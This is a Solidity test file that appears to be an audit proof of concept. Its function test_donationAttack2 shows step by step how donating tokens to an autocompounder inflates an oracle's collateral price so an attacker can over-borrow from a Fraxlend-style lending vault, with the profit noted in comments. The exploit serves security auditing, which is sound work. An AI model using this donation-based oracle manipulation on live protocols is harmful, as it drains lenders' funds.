// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import { PodHandler } from '../invariant/handlers/PodHandler.sol';
import { LeverageManagerHandler } from '../invariant/handlers/LeverageManagerHandler.sol';
import { AutoCompoundingPodLpHandler } from '../invariant/handlers/AutoCompoundingPodLpHandler.sol';
import { StakingPoolHandler } from '../invariant/handlers/StakingPoolHandler.sol';
import { LendingAssetVaultHandler } from '../invariant/handlers/LendingAssetVaultHandler.sol';

import { IUniswapV2Pair } from 'uniswap-v2/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import { IFraxlendPair } from '../invariant/modules/fraxlend/interfaces/IFraxlendPair.sol';
import { FullMath } from 'v3-core/libraries/FullMath.sol';
import { IFraxlendPair } from '../invariant/modules/fraxlend/interfaces/IFraxlendPair.sol';
import { FraxlendPair } from '../invariant/modules/fraxlend/FraxlendPair.sol';

import { VaultAccount, VaultAccountingLibrary } from '../invariant/modules/fraxlend/libraries/VaultAccount.sol';
import { IRateCalculatorV2 } from '../invariant/modules/fraxlend/interfaces/IRateCalculatorV2.sol';
import { IERC20 } from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';
import { IDexAdapter } from '../../contracts/interfaces/IDexAdapter.sol';

import { console2 } from 'forge-std/console2.sol';

interface IMinimalSinglePriceOracle {
  function getPriceUSD18(
    address base,
    address quote,
    address a1, // any extra address parameter an implementation may need
    uint256 q1 // any extra uint256 parameter an implementation may need
  ) external view returns (bool isBadData, uint256 price18);
}

interface IStakingPoolToken {
  function stake(address user, uint256 amount) external;
}

contract ManipulateASPOracleTest is
  PodHandler,
  LeverageManagerHandler,
  AutoCompoundingPodLpHandler,
  StakingPoolHandler,
  LendingAssetVaultHandler
{
  using VaultAccountingLibrary for VaultAccount;

  constructor() payable {
    setup();
    vm.startPrank(_leverageManager.owner());
    _leverageManager.setCloseFeePerc(20);
    vm.stopPrank();

    _uniOracle.setMaxOracleDelay(10 days);
    _clOracle.setMaxOracleDelay(10 days);
    _peasPriceFeed.updateAnswer(3e18);
    _daiPriceFeed.updateAnswer(1e18);
    _wethPriceFeed.updateAnswer(3000e18);
  }

  struct TestTemps {
    uint256 LAVTotalAssets;
    uint256 LAVTotalAssetsUtilized;
    uint256 LAVTotalAvailableAssets;
    uint128 vaultATotalAssets;
    uint128 vaultATotalBorrows;
    uint256 vaultALAVUtilization;
    uint256 vaultAUtilizationRate;
    uint256 vaultAInterestEarned;
    uint128 vaultBTotalAssets;
    uint128 vaultBTotalBorrows;
    uint256 vaultBLAVUtilization;
    uint256 vaultBUtilizationRate;
    uint256 vaultBInterestEarned;
  }

  function test_donationAttack2() public {
    TestTemps memory cache;

    address userA = randomAddress(1);
    deal(address(_aspTKN1Peas), userA, 100 ether);
    deal(address(_peas), userA, 100_000 ether);
    deal(address(_pod1Peas.PAIRED_LP_TOKEN()), userA, 10 ether);

    // setup autocompounder with some liquidity
    vm.startPrank(userA);
    // deposit peas to pod
    IERC20(address(_peas)).approve(address(_pod1Peas), type(uint256).max);
    _pod1Peas.bond(address(_peas), 10 ether, 0);

    // add liquidity to v2
    IERC20(_pod1Peas.PAIRED_LP_TOKEN()).approve(
      address(_pod1Peas),
      type(uint256).max
    );
    uint256 lpAmount = _pod1Peas.addLiquidityV2(
      IERC20(_pod1Peas).balanceOf(userA),
      10 ether,
      1000,
      block.timestamp
    );

    IDexAdapter dexAdapter = _pod1Peas.DEX_HANDLER();
    address lpToken = dexAdapter.getV2Pool(
      address(_pod1Peas),
      _pod1Peas.PAIRED_LP_TOKEN()
    );
    // address lpToken = 0x3D58c6B44667733aF22Ed7D2c6A20C1ae4D134F5;

    // stake in staking pool
    IERC20(lpToken).approve(address(_pod1Peas.lpStakingPool()), lpAmount);
    IStakingPoolToken(_pod1Peas.lpStakingPool()).stake(userA, lpAmount);

    // deposit to autocompounder
    IERC20(_pod1Peas.lpStakingPool()).approve(address(_aspTKN1Peas), lpAmount);
    _aspTKN1Peas.deposit(lpAmount, userA);

    address asset = _fraxLPToken1Peas.asset();

    // start of attack //

    // price of PEAS
    (bool _isBadData, uint256 _price18) = IMinimalSinglePriceOracle(
      address(_uniOracle)
    ).getPriceUSD18(
        address(_daiPriceFeed),
        address(_peas),
        address(_v3peasDaiPool),
        10 minutes
      );
    assertEq(_price18, 1e18); // 1 PEAS = 1 DAI

    // price of aspTKN / DAI
    (, , uint256 _aspTKNPriceHigh) = _aspTKNMinOracle1Peas.getPrices();
    assertEq(_aspTKNPriceHigh, 502518907629634044); // 0.503 ether
    // console2.log("aspTKN price high", _aspTKNPriceHigh);

    // can borrow up to 149 dai with 100 aspTKNs
    uint256 _ltv = _getLTV(149 ether, 100 ether, _aspTKNPriceHigh);
    assertEq(_ltv, 74875); // 74.875% (maxLTV = 75%)
    // console2.log("ltv", _ltv);

    vm.startPrank(userA);

    // move time so that exchange rate is re-calculated
    vm.warp(block.timestamp + 1 days);

    // donate 50 PEAS rewards to autocompounder to increase cbr
    IERC20(address(_peas)).transfer(address(_aspTKN1Peas), 50 ether);

    vm.stopPrank();

    // prank owner to trigger rewards processing
    _aspTKN1Peas.processAllRewardsTokensToPodLp(0, block.timestamp);

    vm.startPrank(userA);
    // observe price of aspTKN / DAI decrease (i.e. asptTKN appreciates)
    (, , _aspTKNPriceHigh) = _aspTKNMinOracle1Peas.getPrices();
    assertEq(_aspTKNPriceHigh, 149260885254417001); // 0.149 ether
    // console2.log("aspTKN price high", _aspTKNPriceHigh);

    // now can borrow up to 500 dai with 100 aspTKNs
    _ltv = _getLTV(500 ether, 100 ether, _aspTKNPriceHigh);
    assertEq(_ltv, 74630); // 74.630% (maxLTV = 75%)
    // console2.log("ltv", _ltv);

    // borrow succeeds
    IERC20(_aspTKN1Peas).approve(address(_fraxLPToken1Peas), type(uint256).max);
    _fraxLPToken1Peas.borrowAsset(500 ether, 100 ether, userA);

    // attacker used 50 PEAS (50 DAI) to borrow additional 351 DAI
  }

  function _getLTV(
    uint256 _borrowAmount,
    uint256 _collateralAmount,
    uint256 _price18
  ) internal pure returns (uint256 ltv) {
    uint256 EXCHANGE_PRECISION = 1e18;
    uint256 LTV_PRECISION = 1e5;
    ltv =
      (((_borrowAmount * _price18) / EXCHANGE_PRECISION) * LTV_PRECISION) /
      _collateralAmount;
  }
}
